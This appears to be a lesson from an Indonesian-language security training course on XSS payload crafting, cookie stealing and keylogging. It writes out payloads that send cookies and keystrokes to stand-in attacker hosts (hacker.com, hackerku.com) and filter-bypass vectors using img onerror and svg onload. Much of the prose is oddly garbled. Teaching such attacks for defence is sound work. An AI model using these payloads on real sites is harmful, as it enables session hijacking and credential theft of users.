# 💀 Week 17 · Day 1: XSS (Payload Crafting & Cookie Stealing)

> **Rank**: BREACH | **Minggu ke-17**, Hari 1/5 | **Durasi**: ~45 menit

📊 **Progress**: Week 17 · Day 1/5 | BREACH Rank (Minggu 3 dari 5) | Overall: 81/120 hari (68%)

---

## 🎯 Tujuan Hari Ini

Setelah menyelesaikan materi hari ini, kamu akan mampu:

1. **Merakit** payload skrip injeksi peretasan parameter *XSS* tingkat mahir (*Payload Crafting*).
2. **Mengeksploitasi** penyimpanan sesi peramban *Cookie* sasaran untuk diekstraksi dan dirampas utuh.
3. **Mensimulasikan** delegasi peretasan arsitektur penyadapan pelaporan tombol papan ketik peramban pengguna target (*Keylogging*).

---

## 📖 Materi Inti

### Seni Meracik Payload XSS (Payload Crafting)

Pada modul *Forge Rank* (Minggu 14), Anda telah meninjau konsep *XSS (Cross-Site Scripting)* sebagai kerentanan arsitektur aplikasi web di mana peladen secara fatal lalai memvalidasi lantas eksekusi kodingan *JavaScript* modifikasi penganalisis (sebagai contoh pop-up layar `alert(1)`). 

Bagi spesialis penganalisis industri di jenjang kompetensi *Breach Rank*, mencetak ekskavasi Pop-up peringatan tersebut merupakan eksploitasi parameter evaluasi awal semata. Jika spesialis arsitektur telah berhasil mengeksploitasi *Browser* pengguna sasaran untuk menelan lantas mengeksekusi parameter instruksional *JavaScript*, maka tahapan eskalasi berikutnya adalah: peramban tersebut untuk meretas dan menyerahkan arsip parameter kredensial informasinya secara komprehensif! Skrip peretasan terstruktur yang diracik spesifik ini didefinisikan secara nomenklatur taktis sebagai arsitektur **Payload**.

### 1. Merampas Identitas Sesi Otentik (Cookie Stealing)

kalung otentikasi sesi *Session Cookie* merupakan sandi otorisasi esensial hak kendali Admin. Jika entitas Administrator peladen menyimpan kalung sesi otentikasi komputasinya dalam antarmuka *Cookie* yang rentan lantaran tidak dikonfigurasi proteksi pelindungan atribut bendera sandi *HttpOnly*, penganalisis penyerang dapat mengekstraksinya!

Asumsikan agen penganalisis (*Hacker*) mengoperasikan peladen sasaran eksternal penampung beridentitas `hacker.com/curi`.
Peretas menyusupkan skrip modifikasi arsitektur *XSS Stored* di kolom Komentar target:
```html
<script>
 // peramban ekstraksi cookie lantas mentransmisikannya ke server penadah
 fetch('http://hacker.com/curi?kuki=' + document.cookie);
</script>
```
Ketika Administrator sasaran membaca komentar tersebut, arsitektur *Browser* si Admin secara otomatis perintah eksekusi menyedot fungsi parameter *Cookie* otentik Admin, lantas peramban mentransmisikan sandi tersebut menyeberang ke peladen penadah milik *Hacker* secara sunyi tanpa disadari penggunanya sedikit pun!

### 2. Mengekskavasi Rekaman Tombol Papan Ketik (XSS Keylogging)

Bagaimana jika arsitektur peladen mencegah pelaporan ekstraksi *Cookie* secara spesifik (misal via WAF)? Tahapan taktis modifikasi eksploitasinya: Spesialis penganalisis pembajakan parameter masukan interaksi *Keyboard* peramban penggunanya!
Peretas meracik *Payload* penyadap arsitektur ketikan (*Keylogger*):

```html
<script>
 // Merekam setiap eksekusi tuts ketikan peramban di layar
 document.addEventListener('keypress', function(e) {
 fetch('http://hacker.com/curi_huruf?ketik=' + e.key);
 });
</script>
```
Terhitung sejak detik skrip tersebut dieksekusi peladen korban, setiap kali sasaran Administrator mengoperasikan pengetikan sandi rahasia atau pelaporan pesan di layar antarmukanya, huruf demi huruf tersebut akan diterbangkan terkirim diam-diam secara ke infrastruktur server Hacker penyerang. Inilah ekskavasi arsitektur fatal *XSS* mutakhir! 

### Merobek Perisai Penapisan WAF (WAF Bypass)

Terkadang infrastruktur *Firewall (WAF)* peladen memblokir fungsi pengetikan eksplisit deklarasi tag `<script>`. Agen penyerang mengadaptasi taktis dengan meracik injeksi *Payload* tanpa melibatkan tag *script*, yakni mengimplementasikan manipulasi pelaporan kerentanan pemancing *event handler* di atribut tag *HTML* lain, semisal ekskavasi Tag Gambar arsitektur atau sandi SVG:
- `<img src="x" onerror="alert(document.cookie)">` 
 *(Representasi logika : Perintahkan peramban memanggil gambar bernilai 'x'. Ketika pencarian gambar itu gagal (error), maka peramban lantas diperintahkan mengeksekusi komando alert XSS di sebelah fungsinya!)*
- `<svg onload=alert(1)>`

---

## 🧪 Mini Lab

**Durasi**: ~10 menit

Mari menyimulasikan penyusunan peretasan penyedot parameter sesi (*Cookie Stealing*)!

1. Kunjungi pelataran laboratorium eksekusi *PortSwigger XSS Labs*.
2. Asumsikan Anda ditugaskan klien menguji penetrasi dengan menyeludupkan *Stored XSS* di antarmuka forum komentar situs.
3. Aplikasi web sasaran ternyata memasang arsitektur pemblokir anti-script sasaran (`<script>` diharamkan secara).
4. Anda lantas memodifikasi peracikan *Payload* kamuflase memanfaatkan taktis *error* tag gambar:
 `<img src="salah" onerror="document.location='http://hackerku.com/curi?kuki='+document.cookie">`
5. Bila kelak kelalaian tersebut diakses dan ada pengguna sasaran mampir memuat laman komentar itu, laman peramban bakal me-*redirect* paksa dirinya menyeberang ke situs milik penganalisis *hacker* sembari secara otomatis menyerahkan pengikatan otorisasi *Cookie*-nya yang dimuat di buntut *URL*.

---

## 💡 Quiz Kilat

<details>
<summary>❓ Membedah konseptual peretasan <i>XSS</i> yang acap diremehkan sekadar selumrah insiden kerentanan pop-up belaka, skrip eksploitasi jenis apakah (yang digariskan bertugas merampas kalung identitas login) yang didapuk laksana metode eksekusi senjata peretasan paling umum dari pengerahan payung <i>XSS</i> ?</summary>

**Jawaban:** Pencurian Sandi otentikasi Sesi Login (Cookie Stealing via eksploitasi manipulasi sandi `document.cookie`).
</details>

<details>
<summary>❓ Ketika spesialis peretas meluncurkan serangan eksploitasi <i>XSS Keylogging</i>, tipe pelaporan peristiwa peramban (Event) <i>JavaScript</i> apakah yang acap didikte lantas direnggut peretas guna menyadap pelaporan ketikan pengguna?</summary>

**Jawaban:** Pengawasan *Event* pendeteksi hentakan tombol (semacam penerapan *event listener* `keypress`, fungsi `keyup`, maupun operasi `keydown`).
</details>

<details>
<summary>❓ Jikalau arsitektur perisai <i>WAF (Web Application Firewall)</i> mengutuk dan secara memblokir pengetikan atribut tag `<script>`, bagaimana siasat penganalisis <i>Hacker</i> meretas bongkahan peramban <i>XSS</i> agar menyusup murni tanpa menggunakan tag keramat tersebut?</summary>

**Jawaban:** Mengeksploitasi pemancing *Event Handlers* yang menempel pada ekstensi atribut tag HTML lain. Contoh pengerahan paling masyhur adalah mengeksploitasi muatan *error* tag pemuatan gambar: `<img src="salah" onerror="alert(1)">` atau tag vektor grafis `<svg onload="alert(1)">`.
</details>

---

## 📋 Checklist Hari Ini

- [ ] Saya menyerap diferensiasi esensi taktis peramban `alert(1)` dibandingkan modifikasi racikan fungsi *Payload Crafting* sejati
- [ ] Saya fasih menjabarkan arsitektur logika eksploitasi curian otentikasi *Cookie Stealing*
- [ ] Saya menguasai mekanisme instruksional penjebol WAF bermodalkan pemancing parameter `<img onerror=>`
- [ ] Saya telah menamatkan pemahaman konsep penyadapan via peramban *Keylogger XSS*
- [ ] Saya telah menjawab evaluasi seluruh *quiz kilat*

---

## 🔗 Resources

- [PayloadsAllTheThings - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) — Kumpulan kompilasi repositori perumusan racikan kamus *Payload* peretasan *XSS* sedunia.

---

## ➡️ Besok

**Day 2: CSRF & SSRF** — Kalau arsitektur *XSS* mengeksploitasi dengan meracuni peramban sasar, besok hari Anda bakal mengadopsi simulasi untuk mengendalikan serta menyetir *Browser* sasaran tanpa disadari secara oleh korbannya sendiri. Bersiaplah mengkaji taktis peramban **CSRF (Cross-Site Request Forgery)**, yakni metode peramban yang secara sanggup memaksa arsitektur peramban Admin *Mentransfer Uang Rekeningnya ke Rekening Hacker *, selagi Admin sasaran menyangka perambannya semata-mata tengah mengklik laman gambar kucing lucu!

---

*📅 TISS Null Teaming · Week 17 · Day 1 · BREACH Rank*
